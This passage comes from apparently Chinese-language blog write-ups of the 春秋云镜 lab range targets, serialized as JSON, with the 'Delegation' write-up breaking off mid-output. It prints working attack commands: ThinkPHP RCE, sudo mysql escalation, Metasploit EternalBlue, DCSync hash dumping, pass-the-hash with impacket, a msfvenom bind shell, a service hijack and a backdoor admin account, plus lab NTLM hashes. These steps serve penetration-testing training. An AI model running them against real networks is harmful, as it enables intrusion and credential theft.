08:00:46] [SUCCESS] 端口开放 39.99.232.66:22\n[2025-04-18 08:00:46] [SUCCESS] 端口开放 39.99.232.66:80\n[2025-04-18 08:00:46] [SUCCESS] 服务识别 39.99.232.66:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux  信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-18 08:00:51] [SUCCESS] 服务识别 39.99.232.66:80 => [http]\n[2025-04-18 08:00:55] [INFO] 存活端口数量: 2\n[2025-04-18 08:00:55] [INFO] 开始漏洞扫描\n[2025-04-18 08:00:55] [INFO] 加载的插件: ssh, webpoc, webtitle\n[2025-04-18 08:00:55] [SUCCESS] 网站标题 http://39.99.232.66       状态码:200 长度:5578   标题:Bootstrap Material Admin\n[2025-04-18 08:00:57] [SUCCESS] 目标: http://39.99.232.66:80\n  漏洞类型: poc-yaml-thinkphp5023-method-rce\n  漏洞名称: poc1\n  详细信息:\n        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce\n[2025-04-18 08:01:01] [SUCCESS] 扫描已完成: 3/3\n~~~~\n\n80端口存在thinkphp的漏洞，直接工具一把梭了，拿到shell后提一下权,sudo可以无密码执行mysql，mysql提权\n\n~~~\n(www-data:/) $ sudo -l\nMatching Defaults entries for www-data on ubuntu-web01:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\nUser www-data may run the following commands on ubuntu-web01:\n    (root) NOPASSWD: /usr/bin/mysql\n~~~\n\n~~~4\nsudo mysql -e '\\! cat /root/flag/flag01.txt'\n~~~\n\n拿到了flag的第一部分\n\n# FLAG2&&FLAG3\n\n写一个公钥进去，然后ssh登录，上传fscan再做一个代理\n\n~~~\n(www-data:/tmp) $ ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:16:3e:25:0c:72 brd ff:ff:ff:ff:ff:ff\n    inet 172.22.1.15/16 brd 172.22.255.255 scope global dynamic eth0\n       valid_lft 315359017sec preferred_lft 315359017sec\n    inet6 fe80::216:3eff:fe25:c72/64 scope link \n       valid_lft forever preferred_lft forever\n~~~\n\n~~~\nroot@ubuntu-web01:~# ./fscan -h 172.22.1.15/24\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-04-18 20:14:45] [INFO] 暴力破解线程数: 1\n[2025-04-18 20:14:45] [INFO] 开始信息扫描\n[2025-04-18 20:14:45] [INFO] CIDR范围: 172.22.1.0-172.22.1.255\n[2025-04-18 20:14:45] [INFO] 生成IP范围: 172.22.1.0.%!d(string=172.22.1.255) - %!s(MISSING).%!d(MISSING)\n[2025-04-18 20:14:45] [INFO] 解析CIDR 172.22.1.15/24 -> IP范围 172.22.1.0-172.22.1.255\n[2025-04-18 20:14:45] [INFO] 最终有效主机数量: 256\n[2025-04-18 20:14:45] [INFO] 开始主机扫描\n[2025-04-18 20:14:45] [SUCCESS] 目标 172.22.1.15     存活 (ICMP)\n[2025-04-18 20:14:45] [SUCCESS] 目标 172.22.1.21     存活 (ICMP)\n[2025-04-18 20:14:45] [SUCCESS] 目标 172.22.1.2      存活 (ICMP)\n[2025-04-18 20:14:45] [SUCCESS] 目标 172.22.1.18     存活 (ICMP)\n[2025-04-18 20:14:48] [INFO] 存活主机数量: 4\n[2025-04-18 20:14:48] [INFO] 有效端口数量: 233\n[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:88\n[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:80\n[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.15:80\n[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.15:22\n[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:445\n[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:445\n[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.21:445\n[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:389\n[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:139\n[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:139\n[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.21:139\n[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:135\n[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:135\n[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.21:135\n[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:3306\n[2025-04-18 20:14:49] [SUCCESS] 服务识别 172.22.1.15:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-18 20:14:53] [SUCCESS] 服务识别 172.22.1.18:3306 => [mysql] 产品:MySQL 信息:unauthorized Banner:[D.j Host '172.22.1.15' is not allowed to connect to this MySQL server]\n[2025-04-18 20:14:53] [SUCCESS] 服务识别 172.22.1.2:88 =>\n[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.18:445 =>\n[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.2:445 =>\n[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.21:445 =>\n[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.2:389 => [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name\n[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.2:139 =>  Banner:[.]\n[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.18:139 =>  Banner:[.]\n[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.21:139 =>  Banner:[.]\n[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.18:80 => [http]\n[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.15:80 => [http]\n\n[2025-04-18 20:15:54] [SUCCESS] 服务识别 172.22.1.18:135 =>\n[2025-04-18 20:15:54] [SUCCESS] 服务识别 172.22.1.2:135 =>\n[2025-04-18 20:15:54] [SUCCESS] 服务识别 172.22.1.21:135 =>\n[2025-04-18 20:15:54] [INFO] 存活端口数量: 15\n[2025-04-18 20:15:54] [INFO] 开始漏洞扫描\n[2025-04-18 20:15:54] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle\n[2025-04-18 20:15:54] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.1.21\n主机名: XIAORANG-WIN7\n发现的网络接口:\n   IPv4地址:\n      └─ 172.22.1.21\n[2025-04-18 20:15:54] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.1.2\n主机名: DC01\n发现的网络接口:\n   IPv4地址:\n      └─ 172.22.1.2\n[2025-04-18 20:15:54] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.1.18\n主机名: XIAORANG-OA01\n发现的网络接口:\n   IPv4地址:\n      └─ 172.22.1.18\n[2025-04-18 20:15:54] [SUCCESS] 网站标题 http://172.22.1.15        状态码:200 长度:5578   标题:Bootstrap Material Admin\n[2025-04-18 20:15:54] [INFO] 系统信息 172.22.1.2 [Windows Server 2016 Datacenter 14393]\n[2025-04-18 20:15:54] [SUCCESS] NetBios 172.22.1.2      DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393\n[2025-04-18 20:15:54] [SUCCESS] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1\n[2025-04-18 20:15:54] [SUCCESS] 发现漏洞 172.22.1.21 [Windows Server 2008 R2 Enterprise 7601 Service Pack 1] MS17-010\n[2025-04-18 20:15:54] [SUCCESS] 网站标题 http://172.22.1.18        状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.1.18?m=login\n[2025-04-18 20:15:54] [SUCCESS] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600\n[2025-04-18 20:15:55] [SUCCESS] 网站标题 http://172.22.1.18?m=login 状态码:200 长度:4012   标题:信呼协同办公系统\n[2025-04-18 20:15:55] [SUCCESS] 目标: http://172.22.1.15:80\n  漏洞类型: poc-yaml-thinkphp5023-method-rce\n  漏洞名称: poc1\n  详细信息:\n        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce\n~~~\n\n 172.22.1.21 有永恒之蓝，上msf梭哈\n\n~~~\nproxychains4 msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset payload windows/x64/meterpreter/bind_tcp_uuid\nset RHOSTS 172.22.1.21\nexploit\n~~~\n\n收集一些域内哈希\n\n~~~\nmeterpreter > load kiwi\nmeterpreter > kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv\n[DC] 'xiaorang.lab' will be the domain\n[DC] 'DC01.xiaorang.lab' will be the DC server\n[DC] Exporting domain 'xiaorang.lab'\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514\n1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512\n1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512\n1000    DC01$   09bb349ab17bbe480b91eb20bb204bee        532480\n500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512\n1104    XIAORANG-OA01$  25e4b9f501c8831b0568fcc61e4ddc7f        4096\n1108    XIAORANG-WIN7$  acf1bc550440e81c9f2663ff304b4ab3        4096\n~~~\n\n有域控的哈希了直接打域控，然后就可以为所欲为了\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# impacket-psexec  -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/Administrator@172.22.1.2 -codec gbk\nC:\\Users\\Administrator\\flag> type flag03.txt\n~~~\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# impacket-psexec  -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/Administrator@172.22.1.18 -codec gbk\nC:\\Users\\Administrator\\flag> type flag02.txt\n~~~\n\n---\n\n\n\n看别人的wp，好像是要先打172.22.1.18，是一个OA系统可以打nday一把梭，我就不看了\n","tags":["靶机"],"categories":["春秋云镜"]},{"title":"春秋云镜-Delegation","url":"/2025/04/18/春秋云镜-Delegation/","content":"\n\n\n# FLAG1\n\n首先对靶机进行信息搜集\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# ../pentest/fscan/fscan2 -h 39.99.130.13\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-04-17 22:29:55] [INFO] 暴力破解线程数: 1\n[2025-04-17 22:29:55] [INFO] 开始信息扫描\n[2025-04-17 22:29:55] [INFO] 最终有效主机数量: 1\n[2025-04-17 22:29:55] [INFO] 开始主机扫描\n[2025-04-17 22:29:55] [INFO] 有效端口数量: 233\n[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:22\n[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:21\n[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:3306\n[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:80\n[2025-04-17 22:29:56] [SUCCESS] 服务识别 39.99.130.13:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux  信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-17 22:29:56] [SUCCESS] 服务识别 39.99.130.13:21 => [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]\n[2025-04-17 22:30:01] [SUCCESS] 服务识别 39.99.130.13:3306 => [mysql] 版本:8.0.29-0ubuntu0.20.04.3 产品:MySQL\n[2025-04-17 22:30:01] [SUCCESS] 服务识别 39.99.130.13:80 => [http]\n[2025-04-17 22:30:04] [INFO] 存活端口数量: 4\n[2025-04-17 22:30:04] [INFO] 开始漏洞扫描\n[2025-04-17 22:30:04] [INFO] 加载的插件: ftp, mysql, ssh, webpoc, webtitle\n[2025-04-17 22:30:05] [SUCCESS] 网站标题 http://39.99.130.13       状态码:200 长度:68104  标题:中文网页标题\n~~~\n\n80端口是cmseasy,url后面拼接/admin版本号是v7752,在网上可以查到漏洞\n\nhttps://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/\n\n都需要登录后台，弱口令admin:123456登录成功了\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation1.png)\n\n发包然后去访问1.php可以发现写入成功了，写个一句话木马，然后蚁剑连接\n\nflag在/home/flag/下，但是只有root能查看，反弹一个shell准备提权\n\n~~~\nwww-data@localhost:/var/www/html$ find / -perm -u=s 2>/dev/null\nfind / -perm -u=s 2>/dev/null\n\n/usr/bin/stapbpf\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/bin/su\n/usr/bin/chsh\n/usr/bin/staprun\n/usr/bin/at\n/usr/bin/diff\n/usr/bin/fusermount\n/usr/bin/sudo\n/usr/bin/mount\n/usr/bin/newgrp\n/usr/bin/umount\n/usr/bin/passwd\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n~~~\n\n可以看到diff具有suid权限，可以读取flag01.txt\n\n# FLAG2\n\n还给了一个hint\n\n~~~\nGreat job!!!!!!\nHere is the hint: WIN19\\Adrian\nI'll do whatever I can to rock you...\n~~~\n\n上传一个fscan先扫，然后做一个代理隧道\n\n~~~\nwww-data@localhost:/tmp$ ./fscan -h 172.22.4.36/24\n./fscan -h 172.22.4.36/24\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| '__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   <     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-04-18 11:04:32] [INFO] 暴力破解线程数: 1\n[2025-04-18 11:04:32] [INFO] 开始信息扫描\n[2025-04-18 11:04:32] [INFO] CIDR范围: 172.22.4.0-172.22.4.255\n[2025-04-18 11:04:32] [INFO] 生成IP范围: 172.22.4.0.%!d(string=172.22.4.255) - %!s(MISSING).%!d(MISSING)\n[2025-04-18 11:04:32] [INFO] 解析CIDR 172.22.4.36/24 -> IP范围 172.22.4.0-172.22.4.255\n[2025-04-18 11:04:33] [INFO] 最终有效主机数量: 256\n[2025-04-18 11:04:33] [INFO] 开始主机扫描\n[2025-04-18 11:04:33] [INFO] 正在尝试无监听ICMP探测...\n[2025-04-18 11:04:33] [INFO] 当前用户权限不足,无法发送ICMP包\n[2025-04-18 11:04:33] [INFO] 切换为PING方式探测...\n[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.7      存活 (ICMP)\n[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.36     存活 (ICMP)\n[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.45     存活 (ICMP)\n[2025-04-18 11:04:33] [SUCCESS] 目标 172.22.4.19     存活 (ICMP)\n[2025-04-18 11:04:39] [INFO] 存活主机数量: 4\n[2025-04-18 11:04:39] [INFO] 有效端口数量: 233\n[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:80\n[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:80\n[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:135\n[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:139\n[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.19:135\n[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:139\n[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:135\n[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.19:139\n[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:389\n[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:445\n[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:22\n[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:21\n[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.19:445\n[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.45:445\n[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.7:88\n[2025-04-18 11:04:39] [SUCCESS] 端口开放 172.22.4.36:3306\n[2025-04-18 11:04:39] [SUCCESS] 服务识别 172.22.4.36:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-04-18 11:04:40] [SUCCESS] 服务识别 172.22.4.36:21 => [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]\n[2025-04-18 11:04:40] [SUCCESS] 服务识别 172.22.4.36:3306 => [mysql] 版本:8.0.29-0ubuntu0.20.04.3 产品:MySQL Banner:[[.8.0.29-0ubuntu0.20.04.3 @.uoo ^_Z.Q.8Db#X \\>; caching_sha2_password]\n[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.45:80 => [http]\n[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.45:139 =>  Banner:[.]\n[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.7:139 =>  Banner:[.]\n[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.19:139 =>  Banner:[.]\n[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.7:389 => [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name\n[2025-04-18 11:04:44] [SUCCESS] 服务识别 172.22.4.7:445 => \n[2025-04-18 11:04:45] [SUCCESS] 服务识别 172.22.4.19:445 => \n[2025-04-18 11:04:45] [SUCCESS] 服务识别 172.22.4.45:445 => \n[2025-04-18 11:04:45] [SUCCESS] 服务识别 172.22.4.7:88 => \n[2025-04-18 11:04:48] [SUCCESS] 服务识别 172.22.4.36:80 => [http]\n[2025-04-18 11:05:44] [SUCCESS] 服务识别 172.22.4.7:135 => \n[2025-04-18 11:05:44] [SUCCESS] 服务识别 172.22.4.19:135 => \n[2025-04-18 11:05:44] [SUCCESS] 服务识别 172.22.4.45:135 => \n[2025-04-18 11:05:44] [INFO] 存活端口数量: 16\n[2025-04-18 11:05:44] [INFO] 开始漏洞扫描\n[2025-04-18 11:05:44] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle\n[2025-04-18 11:05:44] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.4.45\n主机名: WIN19\n发现的网络接口:\n   IPv4地址:\n      └─ 172.22.4.45\n[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.45     XIAORANG\\WIN19                \n[2025-04-18 11:05:45] [SUCCESS] 网站标题 http://172.22.4.45        状态码:200 长度:703    标题:IIS Windows Server\n[2025-04-18 11:05:45] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.4.7\n主机名: DC01\n发现的网络接口:\n   IPv4地址:\n      └─ 172.22.4.7\n[2025-04-18 11:05:45] [SUCCESS] NetInfo 扫描结果\n目标主机: 172.22.4.19\n主机名: FILESERVER\n发现的网络接口:\n   IPv4地址:\n      └─ 172.22.4.19\n[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.7      DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393\n[2025-04-18 11:05:45] [SUCCESS] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393\n[2025-04-18 11:05:45] [INFO] 系统信息 172.22.4.7 [Windows Server 2016 Datacenter 14393]\n[2025-04-18 11:05:45] [SUCCESS] 网站标题 http://172.22.4.36        状态码:200 长度:68100  标题:中文网页标题\n\n~~~\n\n上面的flag1给了个提示在WIN19那台机器上存在一个Adrian用户，密码在rockyou里\n\n~~~\nSMB         172.22.4.45     445    WIN19            [-] WIN19\\Adrian:babygirl1 STATUS_PASSWORD_EXPIRED\n~~~\n\n还是得眼尖一点，密码过期他不会告诉你，rdp登录修改密码\n\n~~~\nrdesktop 172.22.4.45\n~~~\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation2.png)\n\n桌面上有一个PrivescCheck文件夹，PrivescCheck是一个提权的工具，他跑完了留下一个html文件，直接访问就行\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation3.png)\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation4.png)\n\n给了两个high，第一个WSUS 更多的是被利用来横向移动,第二个注册表，用户对gpupdate具有写、启动、停止的的权限\n\n用msf生成一个正向的木马\n\n~~~\nmsfvenom -p windows/x64/meterpreter/bind_tcp LPORT=9999 -f exe -o bind.exe\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/bind_tcp\nset LPORT 9999\nset RHOST 172.22.4.45\nrun\n~~~\n\n将马上传上去然后修改一下注册表手动启动服务\n\n![](https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation5.png)\n\n~~~\nsc start gupdate\n~~~\n\n但是这个shell很快就会断开，所以要迁移到另一个进程中\n\n~~~\nps\nmigrate PID\n~~~\n\n不知道为什么我的msf shell启动不起来，导出hash\n\n~~~\nload kiwi\ncreds_all\nmeterpreter > creds_all\n[+] Running as SYSTEM\n[*] Retrieving all credentials\nmsv credentials\n===============\n\nUsername  Domain    NTLM                              SHA1\n--------  ------    ----                              ----\nAdrian    WIN19     4ba5d16eb261eb61148ab5264f457cbb  9a712bd84b09123d36da74d9d5ac255c027588eb\nWIN19$    XIAORANG  d41fef724adf6f2ed2cbb5a4ebd186c9  af156e5c6afc93b1a648040bd59f7d5cab23d81a\nWIN19$    XIAORANG  5943c35371c96f19bda7b8e67d041727  5a4dc280e89974fdec8cf1b2b76399d26f39b8f8\n\nwdigest credentials\n===================\n\nUsername  Domain    Password\n--------  ------    --------\n(null)    (null)    (null)\nAdrian    WIN19     (null)\nWIN19$    XIAORANG  (null)\n\nkerberos credentials\n====================\n\nUsername  Domain        Password\n--------  ------        --------\n(null)    (null)        (null)\nAdrian    WIN19         (null)\nWIN19$    xiaorang.lab  ab 04 9b b9 d9 60 00 27 6b a0 0c 12 eb 66 73 a5 28 ef 5c 0e c3 89 fa c2 4b f8 67 35 a9 25\n                         75 bd c0 62 20 be d1 58 31 0b d1 5b 0e 15 41 4f c6 c6 4f 10 43 c8 cf a4 66 b8 0b 5c e8 4\n                        5 dd 12 e9 f9 8b 47 4c e1 6d cb 52 e1 5f 97 c3 73 1b 79 89 ca 8d 4c bf 42 47 4b 69 91 16\n                        9e 01 e2 78 36 07 fe 11 3b 1f f0 0a 12 6a d7 d8 b1 71 de 2e bd 75 84 c7 00 fa 3b 7c 7f 9a\n                         75 85 e8 93 23 ae 41 64 34 7d da 85 3a 5e 61 72 a4 5d 39 57 4b 1e ab 81 a7 02 ef ac 6c 6\n                        1 af 28 2a ee ab 34 ce 1e 00 d3 f7 89 d7 fd 40 29 ce 0c e2 c3 d1 fa d8 9f df d2 3d 7e 9d\n                        d8 05 77 70 60 3c 7d a6 d3 83 a7 e2 bf b0 a2 c7 57 97 d0 d3 ab c0 ee cb e2 b7 3d e7 a6 5d\n                         fd de 51 0c f2 69 d1 58 af ee 8d d1 c0 a3 14 ab 09 c8 9d db 37 e6 8e 62 b2 71 61 d6 2d 5\n                        c 57 a8\nWIN19$    xiaorang.lab  3a 94 de 4d 87 8e 7d 46 88 ec 9c 70 fd f0 c5 3e 4c f3 ce 6a 80 79 46 c6 2f f9 52 9b 4e 1d\n                         90 58 52 2a 4e ac bf 05 09 08 06 0c 4b a9 a2 aa a2 9d db 0d f8 09 82 c0 6e f4 1b 81 93 5\n                        9 67 54 de 17 82 d7 c3 82 c5 38 13 4f d0 55 98 f6 a2 cc e7 cb 85 84 35 8a 0c 2e 9f d1 90\n                        0c 0f c1 ea 0d d9 c5 d9 7f 29 a3 57 46 6b bf a4 b9 73 9a 80 84 1d df 3f 33 f5 16 e4 ee 2e\n                         d3 88 92 cd a5 6e ac e3 eb 71 43 ed 7c b8 a2 9e 52 d5 31 1c 50 9b c8 71 03 e1 8e 4f 60 5\n                        3 84 13 19 02 e2 8d 92 3f dc 0b 38 2c 13 c1 0e 6b 64 a7 fc 7a 2a a5 0e e0 b0 66 a9 a0 2f\n                        8d 8d 40 f8 72 d3 36 d3 3a a9 0d 3f b9 00 ef 3e 90 d9 36 a2 ad 36 2a 22 cd a0 cc 5b f4 0e\n                         a4 6b d3 24 8e 6e 99 59 96 d9 f8 a7 26 09 58 0a c2 3a 69 56 76 40 b9 10 92 a7 5c aa 3d e\n                        1 d0 1f\nwin19$    XIAORANG.LAB  ab 04 9b b9 d9 60 00 27 6b a0 0c 12 eb 66 73 a5 28 ef 5c 0e c3 89 fa c2 4b f8 67 35 a9 25\n                         75 bd c0 62 20 be d1 58 31 0b d1 5b 0e 15 41 4f c6 c6 4f 10 43 c8 cf a4 66 b8 0b 5c e8 4\n                        5 dd 12 e9 f9 8b 47 4c e1 6d cb 52 e1 5f 97 c3 73 1b 79 89 ca 8d 4c bf 42 47 4b 69 91 16\n                        9e 01 e2 78 36 07 fe 11 3b 1f f0 0a 12 6a d7 d8 b1 71 de 2e bd 75 84 c7 00 fa 3b 7c 7f 9a\n                         75 85 e8 93 23 ae 41 64 34 7d da 85 3a 5e 61 72 a4 5d 39 57 4b 1e ab 81 a7 02 ef ac 6c 6\n                        1 af 28 2a ee ab 34 ce 1e 00 d3 f7 89 d7 fd 40 29 ce 0c e2 c3 d1 fa d8 9f df d2 3d 7e 9d\n                        d8 05 77 70 60 3c 7d a6 d3 83 a7 e2 bf b0 a2 c7 57 97 d0 d3 ab c0 ee cb e2 b7 3d e7 a6 5d\n                         fd de 51 0c f2 69 d1 58 af ee 8d d1 c0 a3 14 ab 09 c8 9d db 37 e6 8e 62 b2 71 61 d6 2d 5\n                        c 57 a8\n\n\n~~~\n\nhashdump\n\n~~~\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::\nAdrian:1003:aad3b435b51404eeaad3b435b51404ee:4ba5d16eb261eb61148ab5264f457cbb:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e:::\n~~~\n\n用Administrator登录\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# impacket-wmiexec  -hashes aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab Administrator@172.22.4.45\nC:\\>type C:\\Users\\Administrator\\flag\\flag02.txt\n~~~\n\n# FLAG3&FLAG4\n\n添加一个新用户\n\n~~~\nnet user lv Asd123132 /add\nnet localgroup administrators lv /add\n~~~\n\n查看域内委派关系\n\n~~~\nC:\\Users\\lv\\Desktop>Adinfo_win.exe -d=\"xiaorang.lab\" --dc=\"172.22.4.7\" -u=\"WIN19$\" -H=\"d41fef724adf6f2ed2cbb5a4ebd186c9\"\n\n           _____  _        